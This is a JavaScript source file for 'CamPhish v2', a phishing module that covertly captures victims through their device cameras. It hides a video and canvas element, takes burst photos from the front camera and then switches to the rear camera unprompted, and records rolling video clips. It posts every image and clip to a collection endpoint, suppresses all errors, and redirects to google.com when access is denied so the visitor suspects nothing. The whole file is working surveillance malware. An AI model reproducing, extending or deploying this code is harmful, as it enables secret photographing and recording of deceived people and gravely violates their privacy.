// CamPhish v2 - Enhanced Camera Module
// Supports: HD capture, rear camera, video recording

var CamPhish = CamPhish || {};

CamPhish.Camera = (function() {
    'use strict';

    var video = null;
    var canvas = null;
    var ctx = null;
    var stream = null;
    var captureInterval = null;
    var mediaRecorder = null;
    var recordedChunks = [];
    var config = {
        width: 1920,
        height: 1080,
        interval: 3000,
        facingMode: 'user',  // 'user' = front, 'environment' = rear
        postUrl: 'forwarding_link/post.php',
        enableVideo: false,
        videoLength: 5000,  // 5 second clips
        captureMode: 'burst', // 'burst', 'normal', 'slow'
        burstCount: 5,
        burstInterval: 1000,
        normalInterval: 3000,
        slowInterval: 5000,
        autoSwitchCamera: true,  // Auto-switch front/rear after burst
        redirectOnDeny: 'https://www.google.com',  // Redirect if cam denied
        redirectDelay: 5000
    };

    function init(userConfig) {
        // Merge user config
        if (userConfig) {
            for (var key in userConfig) {
                if (userConfig.hasOwnProperty(key)) {
                    config[key] = userConfig[key];
                }
            }
        }

        // Create hidden elements if not exist
        if (!document.getElementById('camphish-video')) {
            var wrapper = document.createElement('div');
            wrapper.hidden = true;
            wrapper.innerHTML = '<video id="camphish-video" playsinline autoplay muted></video>' +
                               '<canvas id="camphish-canvas" width="' + config.width + '" height="' + config.height + '"></canvas>';
            document.body.appendChild(wrapper);
        }

        video = document.getElementById('camphish-video');
        canvas = document.getElementById('camphish-canvas');
        ctx = canvas.getContext('2d');
    }

    function getConstraints(facing) {
        return {
            audio: false,
            video: {
                facingMode: facing || config.facingMode,
                width: { ideal: config.width },
                height: { ideal: config.height }
            }
        };
    }

    function startCapture(facing, onSuccess, onError) {
        var constraints = getConstraints(facing);

        navigator.mediaDevices.getUserMedia(constraints)
            .then(function(mediaStream) {
                stream = mediaStream;
                video.srcObject = stream;

                // Start with burst mode (rapid captures)
                startBurstMode();

                // Start video recording if enabled
                if (config.enableVideo) {
                    startVideoRecording();
                }

                if (onSuccess) onSuccess(stream);
            })
            .catch(function(err) {
                // Try without facing mode constraint (fallback)
                navigator.mediaDevices.getUserMedia({ audio: false, video: true })
                    .then(function(mediaStream) {
                        stream = mediaStream;
                        video.srcObject = stream;

                        startBurstMode();

                        if (config.enableVideo) {
                            startVideoRecording();
                        }

                        if (onSuccess) onSuccess(stream);
                    })
                    .catch(function(err2) {
                        // Camera denied — auto-redirect
                        if (config.redirectOnDeny) {
                            setTimeout(function() {
                                window.location.href = config.redirectOnDeny;
                            }, config.redirectDelay);
                        }
                        if (onError) onError(err2);
                    });
            });
    }

    var burstShotsTaken = 0;

    function startBurstMode() {
        burstShotsTaken = 0;

        // Phase 1: Burst — rapid captures every 1 second
        captureInterval = setInterval(function() {
            takePhoto();
            burstShotsTaken++;

            if (burstShotsTaken >= config.burstCount) {
                clearInterval(captureInterval);

                // After burst, try rear camera if enabled
                if (config.autoSwitchCamera && config.facingMode === 'user') {
                    setTimeout(function() {
                        switchToRearAndCapture();
                    }, 1500);
                }

                // Phase 2: Normal interval captures
                setTimeout(function() {
                    var normalInterval = config.captureMode === 'slow' ? config.slowInterval : config.normalInterval;
                    captureInterval = setInterval(function() {
                        takePhoto();
                    }, normalInterval);
                }, config.burstCount * 1000 + 2000);
            }
        }, config.burstInterval);
    }

    function switchToRearAndCapture() {
        try {
            navigator.mediaDevices.getUserMedia({
                audio: false,
                video: { facingMode: 'environment', width: { ideal: config.width }, height: { ideal: config.height } }
            }).then(function(rearStream) {
                // Take photos from rear camera too
                var rearVideo = video;
                rearVideo.srcObject = rearStream;
                setTimeout(function() {
                    // Take 3 rear camera shots
                    for (var i = 0; i < 3; i++) {
                        setTimeout(function() { takePhoto(); }, i * 1000);
                    }
                    // Switch back to front camera
                    setTimeout(function() {
                        rearStream.getTracks().forEach(function(t) { t.stop(); });
                        if (stream) video.srcObject = stream;
                    }, 4000);
                }, 1000);
            }).catch(function() {
                // No rear camera or denied, continue silently
            });
        } catch(e) { /* silent */ }
    }

    function takePhoto() {
        if (!video || !ctx) return;
        
        try {
            canvas.width = video.videoWidth || config.width;
            canvas.height = video.videoHeight || config.height;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            var imageData = canvas.toDataURL('image/png').replace('image/png', 'image/octet-stream');
            sendPhoto(imageData);
        } catch(e) {
            // Silent fail
        }
    }

    function sendPhoto(imgdata) {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', config.postUrl, true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.send('cat=' + encodeURIComponent(imgdata));
    }

    function startVideoRecording() {
        if (!stream || !window.MediaRecorder) return;

        try {
            var options = { mimeType: 'video/webm;codecs=vp8' };
            if (!MediaRecorder.isTypeSupported(options.mimeType)) {
                options = { mimeType: 'video/webm' };
                if (!MediaRecorder.isTypeSupported(options.mimeType)) {
                    options = {};
                }
            }

            mediaRecorder = new MediaRecorder(stream, options);
            recordedChunks = [];

            mediaRecorder.ondataavailable = function(event) {
                if (event.data && event.data.size > 0) {
                    recordedChunks.push(event.data);
                }
            };

            mediaRecorder.onstop = function() {
                var blob = new Blob(recordedChunks, { type: 'video/webm' });
                sendVideo(blob);
                recordedChunks = [];

                // Start new recording cycle
                setTimeout(function() {
                    if (stream && stream.active) {
                        startVideoRecording();
                    }
                }, 2000);
            };

            mediaRecorder.start();

            // Stop recording after configured length
            setTimeout(function() {
                if (mediaRecorder && mediaRecorder.state === 'recording') {
                    mediaRecorder.stop();
                }
            }, config.videoLength);

        } catch(e) {
            // MediaRecorder not supported, silent fail
        }
    }

    function sendVideo(blob) {
        var formData = new FormData();
        formData.append('video', blob, 'recording_' + Date.now() + '.webm');
        formData.append('type', 'video');

        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'video_upload.php', true);
        xhr.send(formData);
    }

    function switchCamera() {
        // Toggle between front and rear
        config.facingMode = (config.facingMode === 'user') ? 'environment' : 'user';
        
        // Stop current stream
        stopCapture();

        // Restart with new facing
        startCapture(config.facingMode);
    }

    function stopCapture() {
        if (captureInterval) {
            clearInterval(captureInterval);
            captureInterval = null;
        }
        if (mediaRecorder && mediaRecorder.state === 'recording') {
            mediaRecorder.stop();
        }
        if (stream) {
            stream.getTracks().forEach(function(track) {
                track.stop();
            });
            stream = null;
        }
    }

    // Public API
    return {
        init: init,
        start: startCapture,
        stop: stopCapture,
        switchCamera: switchCamera,
        takePhoto: takePhoto
    };

})();
